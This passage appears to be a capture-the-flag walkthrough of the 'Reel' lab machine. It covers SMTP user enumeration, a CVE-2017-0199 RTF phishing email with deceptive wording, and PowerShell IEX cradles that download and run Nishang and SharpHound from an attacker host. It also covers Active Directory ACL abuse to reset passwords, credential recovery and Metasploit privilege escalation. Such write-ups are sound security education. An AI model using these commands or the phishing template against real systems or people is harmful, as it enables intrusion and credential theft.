+<p>When we run <code class="language-plaintext highlighter-rouge">exiftool</code> against the <code class="language-plaintext highlighter-rouge">Windows Event Forwarding.docx</code> file, we do find a user called <code class="language-plaintext highlighter-rouge">nico</code> whose email is <code class="language-plaintext highlighter-rouge">nico@megabank.com</code></p>
+
+<p><img src="/assets/Reel/exiftool-wef-doc.jpg" alt="exiftool-wef-doc" /></p>
+
+<p>we note this down and go verify this user using <code class="language-plaintext highlighter-rouge">smtp-user-enum</code></p>
+
+<h3 id="trying-various-smtp-methods-for-enumeration">Trying various SMTP methods for enumeration</h3>
+
+<p><em>when testing mulitple methods with the</em> <code class="language-plaintext highlighter-rouge">nico</code> <em>user</em>, we still get no hits :/</p>
+
+<p><em>However,</em> we do get a verification when add the <code class="language-plaintext highlighter-rouge">-D</code> flag and supply <code class="language-plaintext highlighter-rouge">megabank.com</code> as the domain.</p>
+
+<p>But only with the <code class="language-plaintext highlighter-rouge">RCPT</code> method:</p>
+
+<p><img src="/assets/Reel/nico-vrfy.jpg" alt="nico-vrfy" /></p>
+
+<p><img src="/assets/Reel/nico-expn.jpg" alt="nico-expn" /></p>
+
+<p><img src="/assets/Reel/nico-rcpt.jpg" alt="nico-rcpt" /></p>
+
+<h3 id="working-on-the-phish">Working on the Phish</h3>
+
+<p>Doing a <strong>Google</strong> search shows an article about <strong>CVE-2017-0199</strong> which looks promising.</p>
+
+<p><img src="/assets/Reel/rtf-exploit-search.jpg" alt="rtf-exploit-search" /></p>
+
+<p><em>According to the article,</em> we should clone a repo (https://github.com/bhdresh/CVE-2017-0199.git) to get a <strong>python</strong> script.</p>
+
+<p>We look at the help:</p>
+
+<p><img src="/assets/Reel/cve-2017-0199-python.jpg" alt="cve-2017-0199-python" /></p>
+
+<p>We need to generate a malicious <code class="language-plaintext highlighter-rouge">RTF</code> document using the first mode <code class="language-plaintext highlighter-rouge">gen</code> and supply a url of an <code class="language-plaintext highlighter-rouge">HTA</code> file to achieve code execution.</p>
+
+<p>Let’s first create the evil <code class="language-plaintext highlighter-rouge">HTA</code> file using <code class="language-plaintext highlighter-rouge">msfvenom</code></p>
+
+<p><img src="/assets/Reel/evil-hta.jpg" alt="evil-hta" /></p>
+
+<p>And create the evil <code class="language-plaintext highlighter-rouge">RTF</code> and call it <code class="language-plaintext highlighter-rouge">review.rtf</code> to look benign</p>
+
+<p><img src="/assets/Reel/evil-rtf.jpg" alt="evil-rtf" /></p>
+
+<p>We host the payload on our kali machine using a standard <code class="language-plaintext highlighter-rouge">python3</code> webserver and start our listener with <code class="language-plaintext highlighter-rouge">nc -lvnp</code> on port 9000</p>
+
+<p><img src="/assets/Reel/hosted-payload.jpg" alt="hosted-payload" /></p>
+
+<p>What’s left is to send the email to <code class="language-plaintext highlighter-rouge">nico@megabank.com</code></p>
+
+<h3 id="sending-the-mail-and-some-deception-">Sending the mail and some deception ;)</h3>
+<p>We’re going to use the <code class="language-plaintext highlighter-rouge">sendEmail</code> command with a couple flags:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-t &lt;RECEPIENT&gt;</code></li>
+  <li><code class="language-plaintext highlighter-rouge">-f &lt;SENDER&gt;</code></li>
+  <li><code class="language-plaintext highlighter-rouge">-s &lt;SMTP_SERVER&gt;</code></li>
+  <li><code class="language-plaintext highlighter-rouge">-u &lt;MAIL_SUBJECT&gt;</code></li>
+  <li><code class="language-plaintext highlighter-rouge">-a &lt;PATH_TO_ATTACHMENT&gt;</code></li>
+  <li><code class="language-plaintext highlighter-rouge">-m &lt;MESSAGE_BODY&gt;</code></li>
+</ul>
+
+<p>Our command is:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sendEmail <span class="se">\</span>
+<span class="nt">-t</span> nico@megabank.com <span class="se">\</span>
+<span class="nt">-f</span> review@megabank.com <span class="se">\</span>
+<span class="nt">-s</span> 10.10.10.77 <span class="se">\</span>
+<span class="nt">-u</span> <span class="s1">'Document for Review'</span> <span class="se">\</span>
+<span class="nt">-a</span> /opt/CVE-2017-0199/review.rtf <span class="se">\</span>
+<span class="nt">-m</span> <span class="s1">'Kindly review the attached document. Just press OK if you get an error while opening it and it should be fine.'</span>
+</code></pre></div></div>
+
+<p>We try to look non-suspicous as possible. And use a subtle message in the body to have the user click ‘OK’ if he gets an error message (<em>which does happen with this exploit</em>).</p>
+
+<p><img src="/assets/Reel/document-error-1.jpg" alt="document-error-1" /></p>
+
+<p><img src="/assets/Reel/document-error-2.jpg" alt="document-error-2" /></p>
+
+<h3 id="triggering-the-exploit-chain">Triggering the exploit chain</h3>
+<p><em>Having everything ready,</em> we trigger the chain:</p>
+
+<ol>
+  <li>Send the malicious <code class="language-plaintext highlighter-rouge">RTF</code> file</li>
+  <li>The <code class="language-plaintext highlighter-rouge">RTF</code> calls back to the <code class="language-plaintext highlighter-rouge">HTA</code> payload hosted on our kali machine</li>
+  <li>The <code class="language-plaintext highlighter-rouge">HTA</code> file is executed and returns a shell on our listening host</li>
+</ol>
+
+<p><img src="/assets/Reel/exploit-chain.jpg" alt="exploit-chain" /></p>
+
+<h3 id="brief-note-on-the-article-content">Brief note on the article content</h3>
+
+<p>The guide talks about using an <code class="language-plaintext highlighter-rouge">exe</code> file. We cannot do so because of <code class="language-plaintext highlighter-rouge">Applocker</code>.</p>
+
+<p>We know this because it was mentioned that the user has set up <code class="language-plaintext highlighter-rouge">Hash Rules</code> for multiple file types:</p>
+
+<p><img src="/assets/Reel/Applocker-docx.jpg" alt="Applocker-docx" /></p>
+
+<p>This is why we generated an <code class="language-plaintext highlighter-rouge">HTA</code> payload using <code class="language-plaintext highlighter-rouge">msfvenom</code> instead.</p>
+
+<h3 id="domain-enumeration-using-sharphoundps1">Domain Enumeration using <code class="language-plaintext highlighter-rouge">SharpHound.ps1</code></h3>
+
+<p><em>Since running</em> <code class="language-plaintext highlighter-rouge">.exe</code> <em>is disabled by</em> <strong>Group Policy</strong>, we turn to <code class="language-plaintext highlighter-rouge">BloodHound</code>’s <strong>PowerShell ingestor</strong> (https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1) and run the <code class="language-plaintext highlighter-rouge">Invoke-BloodHound</code> method.</p>
+
+<p><em>But before we can do that,</em> we need a <strong>PowerShell</strong> shell.</p>
+
+<p>Switching to <strong>PowerShell</strong> from <strong>CMD</strong> can be done with the below command using the famous <strong>Nishang shell</strong> (https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) adding the <code class="language-plaintext highlighter-rouge">Invoke-PowerShellTcp</code> call at the bottom of the <code class="language-plaintext highlighter-rouge">.ps1</code></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell <span class="s2">"IEX(New-Object Net.webClient).downloadString('http://10.10.16.7:8000/nishang.ps1')"</span>
+</code></pre></div></div>
+
+<p><em>To run the</em> <code class="language-plaintext highlighter-rouge">Invoke-BloodHound</code> <em>method</em>, We import the <code class="language-plaintext highlighter-rouge">SharpHound.ps1</code> script into memory using the same we ran <code class="language-plaintext highlighter-rouge">Nishang.ps1</code>:</p>
+
+<p><code class="language-plaintext highlighter-rouge">powershell "IEX(New-Object Net.webClient).downloadString('http://10.10.16.7:8000/SharpHound.ps1')"</code></p>
+
+<h3 id="a-note-on-sharphoundps1-output">A note on <code class="language-plaintext highlighter-rouge">SharpHound.ps1</code> output:</h3>
+
+<p><code class="language-plaintext highlighter-rouge">Sharphound.ps1</code> will generate version 3 <code class="language-plaintext highlighter-rouge">JSON</code> files. Those <em>will not be compatible</em> with the most recent version of <strong>BloodHound</strong> (currently it’s at 4).</p>
+
+<p><img src="/assets/Reel/sharphound-ps1-json-version.jpg" alt="sharphound-ps1-json-version" /></p>
+
+<p><em>To get it working,</em> we will need to get <code class="language-plaintext highlighter-rouge">BloodHound</code> version 3 from the <strong>Official Releases Page</strong> (https://github.com/BloodHoundAD/BloodHound/releases/tag/3.0.3)</p>
+
+<h3 id="investigating-possible-exploit-paths">Investigating Possible Exploit Paths</h3>
+
+<p><em>Upon looking at</em> <code class="language-plaintext highlighter-rouge">BloodHound</code>’s <em>output,</em> we notice that <code class="language-plaintext highlighter-rouge">nico</code> can set the <code class="language-plaintext highlighter-rouge">owner</code> for user <code class="language-plaintext highlighter-rouge">herman</code></p>
+
+<p><img src="/assets/Reel/nico-can-write-owner.jpg" alt="nico-can-write-owner" /></p>
+
+<p><em>Simulating having owned the user</em> <code class="language-plaintext highlighter-rouge">herman</code>, we notice we can reach the <code class="language-plaintext highlighter-rouge">backup_admins</code> group.</p>
+
+<p>This is because the <code class="language-plaintext highlighter-rouge">herman</code> user has a <code class="language-plaintext highlighter-rouge">WriteDACL</code> right over it.</p>
+
+<p><img src="/assets/Reel/herman-has-write-dacl.jpg" alt="herman-has-write-dacl" /></p>
+
+<h3 id="abusing-nicos-writeowner-right-over-herman">Abusing <code class="language-plaintext highlighter-rouge">nico</code>’s <code class="language-plaintext highlighter-rouge">WriteOwner</code> right over <code class="language-plaintext highlighter-rouge">herman</code></h3>
+
+<p><em>Checking the help for the</em> <code class="language-plaintext highlighter-rouge">WriteOwner</code> <em>right</em>, we notice we can use <code class="language-plaintext highlighter-rouge">PowerView</code>’s <code class="language-plaintext highlighter-rouge">Set-DomainObjectOwner</code> function.</p>
+
+<p><img src="/assets/Reel/set-dom-obj-owner.jpg" alt="set-dom-obj-owner" /></p>
+
+<p><strong>Command:</strong></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-DomainObjectOwner</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">herman</span><span class="w"> </span><span class="nt">-OwnerIdentity</span><span class="w"> </span><span class="nx">nico</span><span class="w">
+</span></code></pre></div></div>
+
+<p>We will need to follow up with:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Add-DomainObjectAcl</span><span class="w"> </span><span class="nt">-TargetIdentity</span><span class="w"> </span><span class="nx">herman</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="nx">nico</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">ResetPassword</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="/assets/Reel/add-dom-object-acl.jpg" alt="add-dom-object-acl" /></p>
+
+<p>And set the password for <code class="language-plaintext highlighter-rouge">herman</code> using <code class="language-plaintext highlighter-rouge">Set-DomainUserPassword</code></p>
+
+<p><img src="/assets/Reel/Set-dom-user-pwd.jpg" alt="Set-dom-user-pwd" /></p>
+
+<p>We create a <code class="language-plaintext highlighter-rouge">secure string</code> object using:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$UserPassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="s1">'Password123!'</span><span class="w"> </span><span class="nt">-AsPlainText</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+</span></code></pre></div></div>
+
+<p>and set the password:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-DomainUserPassword</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">herman</span><span class="w"> </span><span class="nt">-AccountPassword</span><span class="w"> </span><span class="nv">$UserPassword</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="logging-in-as-herman-and-joining-the-backup_admins-group">Logging in as herman and joining the <code class="language-plaintext highlighter-rouge">backup_admins</code> group</h3>
+
+<p><em>After resetting the password for</em> <code class="language-plaintext highlighter-rouge">herman</code>, we’re able to login via the open <code class="language-plaintext highlighter-rouge">SSH</code> port:</p>
+
+<p><img src="/assets/Reel/ssh-as-herman.jpg" alt="ssh-as-herman" /></p>
+
+<p>and we can add ourselves to the <code class="language-plaintext highlighter-rouge">backup_admins</code> group easily with <code class="language-plaintext highlighter-rouge">Add-ADGroupMember 'backup_admins' -members herman</code></p>
+
+<p><img src="/assets/Reel/joining-backup-admins.jpg" alt="joining-backup-admins" /></p>
+
+<h3 id="file-system-access-with-backup_adminss-group-membership">File System access with <code class="language-plaintext highlighter-rouge">backup_admins</code>’s group membership</h3>
+
+<p>We first <em>relog</em> to <em>refresh our access</em> and check our newly-found acccess using <code class="language-plaintext highlighter-rouge">PowerShell</code>:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="bp">$Error</span><span class="n">ActionPreference</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'silentlycontinue'</span><span class="w">
+</span><span class="n">ls</span><span class="w"> </span><span class="nt">-recurse</span><span class="w"> </span><span class="nt">-force</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">fullname</span><span class="w"> </span><span class="o">-notmatch</span><span class="w"> </span><span class="s1">'AppData|Application Data|Local Settings'</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{(</span><span class="n">get-acl</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">fullname</span><span class="w"> </span><span class="p">)</span><span class="o">.</span><span class="nf">accesstostring</span><span class="w"> </span><span class="o">-like</span><span class="w"> </span><span class="s1">'*Backup_admins*'</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nt">-expand</span><span class="w"> </span><span class="nx">fullname</span><span class="w">
+</span><span class="bp">$Error</span><span class="n">ActionPreference</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'continue'</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="/assets/Reel/file-access-as-backup-admins.jpg" alt="file-access-as-backup-admins" /></p>
+
+<p>The output suggests we should check out the files in the <code class="language-plaintext highlighter-rouge">Backup Scripts</code> folder.</p>
+
+<p>Checking the <code class="language-plaintext highlighter-rouge">BackupScript.ps1</code> shows a password:</p>
+
+<p><img src="/assets/Reel/backscript-password.jpg" alt="backscript-password" /></p>
+
+<p>Using the password <code class="language-plaintext highlighter-rouge">Cr4ckMeIfYouC4n!</code> works with the administrator user over <code class="language-plaintext highlighter-rouge">SSH</code>:</p>
+
+<p><img src="/assets/Reel/got-admin-path-1.jpg" alt="got-admin-path-1" /></p>
+
+<h3 id="exploit-path-2-nico---tom---claire--backup_admins">Exploit Path #2: <code class="language-plaintext highlighter-rouge">nico</code> -&gt; <code class="language-plaintext highlighter-rouge">tom</code> -&gt; <code class="language-plaintext highlighter-rouge">claire</code> &gt; <code class="language-plaintext highlighter-rouge">backup_admins</code></h3>
+
+<p>On <code class="language-plaintext highlighter-rouge">nico</code>’s desktop we find a file called <code class="language-plaintext highlighter-rouge">cred.xml</code></p>
+
+<p><img src="/assets/Reel/nico-cred-xml.jpg" alt="nico-cred-xml" /></p>
+
+<p><em>looking at its contents,</em> we recognize it’s a <strong>PowerShell Credential Object</strong> that has the username and password of <code class="language-plaintext highlighter-rouge">tom</code></p>
+
+<p><img src="/assets/Reel/ps-cred-object.jpg" alt="ps-cred-object" /></p>
+
+<p>A <strong>PowerShell Credential Object</strong> is used to execute commands <em>using a different set of creds</em> than that of the current user.</p>
+
+<p><em>Without having the password,</em> we can import the credential object using <code class="language-plaintext highlighter-rouge">Import-Clixml</code> cmdlet and use it with the PowerShell <code class="language-plaintext highlighter-rouge">Start-Job</code> cmdlet to launch a <code class="language-plaintext highlighter-rouge">nishang</code> shell as <code class="language-plaintext highlighter-rouge">tom</code></p>
+
+<p><img src="/assets/Reel/cred-to-tom.jpg" alt="cred-to-tom" /></p>
+
+<p>We can also retrieve the plain text password by using the <code class="language-plaintext highlighter-rouge">GetNetworkCredential</code> method of the <code class="language-plaintext highlighter-rouge">System.Management.Automation.PSCredential</code> class:</p>
+
+<p><img src="/assets/Reel/get-network-cred-method.jpg" alt="get-network-cred-method" /></p>
+
+<p><img src="/assets/Reel/toms-password.jpg" alt="toms-password" /></p>
+
+<p>The password works for <code class="language-plaintext highlighter-rouge">tom</code> using <code class="language-plaintext highlighter-rouge">SSH</code></p>
+
+<p><img src="/assets/Reel/tom-ssh.jpg" alt="tom-ssh" /></p>
+
+<p><em>Looking at the exploit path from</em> <code class="language-plaintext highlighter-rouge">tom</code> <em>using</em> <code class="language-plaintext highlighter-rouge">bloodhound</code>, shows the same path like <code class="language-plaintext highlighter-rouge">nico</code></p>
+
+<p><img src="/assets/Reel/tom-owner-claire.jpg" alt="tom-owner-claire" /></p>
+
+<p><img src="/assets/Reel/claire-to-backup-admins.jpg" alt="claire-to-backup-admins" /></p>
+
+<h3 id="exploit-path-3-metasploitation">Exploit Path #3: Metasploitation</h3>
+
+<p>The same exploit for <strong>CVE-2017-0199</strong> exists in a <strong>Metasploit Module</strong> (<code class="language-plaintext highlighter-rouge">windows/fileformat/office_word_hta</code>) when we search using the <code class="language-plaintext highlighter-rouge">rtf</code> keyword:</p>
+
+<p><img src="/assets/Reel/metasploit-rtf-exploit.jpg" alt="metasploit-rtf-exploit" /></p>
+
+<p>setting the options is <strong>critical</strong> here!</p>
+
+<p>We have to set the <code class="language-plaintext highlighter-rouge">SRVHOST</code> option or else it would create the document and embed our <code class="language-plaintext highlighter-rouge">eth0</code> IP address into the document (<em>Troubleshooting this part took me a while</em>).</p>
+
+<p><img src="/assets/Reel/setting-options-msf-exploit.jpg" alt="setting-options-msf-exploit" /></p>
+
+<p>We can send the <code class="language-plaintext highlighter-rouge">doc</code> file to the victim and he would still open it (<em>I didn’t realise this at first and used a</em> <code class="language-plaintext highlighter-rouge">.DOC</code> <em>to</em> <code class="language-plaintext highlighter-rouge">.RTF</code> <em>converter</em>).</p>
+
+<p><img src="/assets/Reel/msf-doc.jpg" alt="msf-doc" /></p>
+
+<p><img src="/assets/Reel/got-meterpreter.jpg" alt="got-meterpreter" /></p>
+
+<p>We will then use <code class="language-plaintext highlighter-rouge">Metasploit</code>’s <code class="language-plaintext highlighter-rouge">local exploit suggester</code> <em>after migrating to a 64-bit process.</em></p>
+
+<p><img src="/assets/Reel/x86-meterpreter.jpg" alt="x86-meterpreter" /></p>
+
+<p><img src="/assets/Reel/migrating-to-64-meterpreter.jpg" alt="migrating-to-64-meterpreter" /></p>
+
+<p>The module finds the host to be <em>vulnerable</em> to <code class="language-plaintext highlighter-rouge">CVE-2019-1458</code> also know as <strong>Wizard Opium</strong>.</p>
+
+<p><img src="/assets/Reel/msf-exp-suggester.jpg" alt="msf-exp-suggester" /></p>
+
+<p>which works like a charm XD</p>
+
+<p><img src="/assets/Reel/wizard-opium-works.jpg" alt="wizard-opium-works" /></p>
+
+<p>another exploit that worked is <code class="language-plaintext highlighter-rouge">CVE-2018-8440</code></p>
+
+<p><img src="/assets/Reel/msf-alpc-privesc.jpg" alt="msf-alpc-privesc" /></p>
+
+<p>Of course these paths are not intended because it’s just using <code class="language-plaintext highlighter-rouge">MetaSploit</code></p>
+
+<h3 id="exploit-path-4-incomplete-abusing-seloaddriverprivilege">Exploit Path #4 (Incomplete): Abusing <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code></h3>
+
+<p>The <code class="language-plaintext highlighter-rouge">tom</code> user is a member of the <code class="language-plaintext highlighter-rouge">Print Operators</code> Group which hold the <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code></p>
+
+<p><img src="/assets/Reel/print-ops-and-load-driver.jpg" alt="print-ops-and-load-driver" /></p>
+
+<p><em>However,</em> exploiting this would be challenging to achieve specially with the <strong>Group Policy</strong> restrictions in place.</p>]]></content><author><name></name></author><summary type="html"><![CDATA[]]></summary></entry></feed>
